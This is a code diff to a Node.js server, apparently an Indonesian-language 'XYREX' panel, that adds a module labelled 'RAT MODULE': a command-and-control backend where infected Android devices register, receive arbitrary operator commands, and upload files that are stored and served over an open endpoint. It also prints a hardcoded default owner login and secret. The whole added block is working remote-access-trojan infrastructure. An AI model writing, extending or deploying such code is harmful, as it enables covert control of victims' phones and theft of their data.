@@ -395,3 +395,99 @@ server.listen(3000, () => {
   console.log('[XYREX] Server jalan di http://localhost:3000');
   console.log('[XYREX] Owner default: Dlizz / 20111608');
 });
+// ===== RAT MODULE =====
+const fs = require('fs');
+const path = require('path');
+const RAT_SECRET = process.env.RAT_SECRET || 'xyrex-rat-20111608';
+const RAT_DEVICES_FILE = './rat_devices.json';
+const RAT_FILES_DIR = './rat_files';
+
+if (!fs.existsSync(RAT_FILES_DIR)) fs.mkdirSync(RAT_FILES_DIR, { recursive: true });
+if (!fs.existsSync(RAT_DEVICES_FILE)) fs.writeFileSync(RAT_DEVICES_FILE, '{}');
+
+function loadRatDevices() {
+  try { return JSON.parse(fs.readFileSync(RAT_DEVICES_FILE, 'utf8')); } catch { return {}; }
+}
+function saveRatDevices(d) {
+  fs.writeFileSync(RAT_DEVICES_FILE, JSON.stringify(d, null, 2));
+}
+
+const ratDevices = loadRatDevices();
+
+const ratNs = io.of('/rat');
+
+ratNs.on('connection', (socket) => {
+  socket.on('rat:register', (payload, cb) => {
+    try {
+      const { deviceId, secret, name, model, android } = payload || {};
+      if (!deviceId || secret !== RAT_SECRET) {
+        if (typeof cb === 'function') cb({ ok: false, error: 'auth' });
+        return socket.disconnect(true);
+      }
+      const rec = {
+        id: deviceId,
+        name: name || 'unknown',
+        model: model || 'unknown',
+        android: android || 'unknown',
+        lastSeen: Date.now(),
+        online: true,
+        socketId: socket.id
+      };
+      ratDevices[deviceId] = rec;
+      saveRatDevices(ratDevices);
+      socket.data.deviceId = deviceId;
+      if (typeof cb === 'function') cb({ ok: true });
+      ratNs.emit('rat:devices', Object.values(ratDevices));
+    } catch (e) {
+      if (typeof cb === 'function') cb({ ok: false, error: 'server' });
+    }
+  });
+
+  socket.on('rat:result', async (payload) => {
+    const { deviceId, cmd, ok, data, text, ext } = payload || {};
+    if (!deviceId) return;
+    let savedFile = null;
+    if (data) {
+      const safeExt = (ext || 'bin').replace(/[^a-z0-9]/gi, '');
+      const fname = `${deviceId}_${cmd}_${Date.now()}.${safeExt}`;
+      const fpath = path.join(RAT_FILES_DIR, fname);
+      try {
+        fs.writeFileSync(fpath, Buffer.from(data, 'base64'));
+        savedFile = `/rat/files/${fname}`;
+      } catch (e) {}
+    }
+    ratNs.emit('rat:result', { deviceId, cmd, ok, text, file: savedFile, at: Date.now() });
+  });
+
+  socket.on('disconnect', () => {
+    const id = socket.data.deviceId;
+    if (id && ratDevices[id]) {
+      ratDevices[id].online = false;
+      ratDevices[id].socketId = null;
+      ratDevices[id].lastSeen = Date.now();
+      saveRatDevices(ratDevices);
+      ratNs.emit('rat:devices', Object.values(ratDevices));
+    }
+  });
+
+  socket.on('rat:cmd', (payload) => {
+    const { deviceId, cmd, args } = payload || {};
+    const dev = ratDevices[deviceId];
+    if (!dev || !dev.online) {
+      socket.emit('rat:result', { deviceId, cmd, ok: false, text: 'device offline' });
+      return;
+    }
+    ratNs.to(dev.socketId).emit('rat:cmd', { cmd, args });
+  });
+
+  socket.on('rat:list', () => {
+    socket.emit('rat:devices', Object.values(ratDevices));
+  });
+});
+
+app.use('/rat/files', express.static(RAT_FILES_DIR));
+
+app.get('/api/rat/devices', (req, res) => {
+  res.json({ ok: true, devices: Object.values(ratDevices) });
+});
+// ===== END RAT MODULE =====
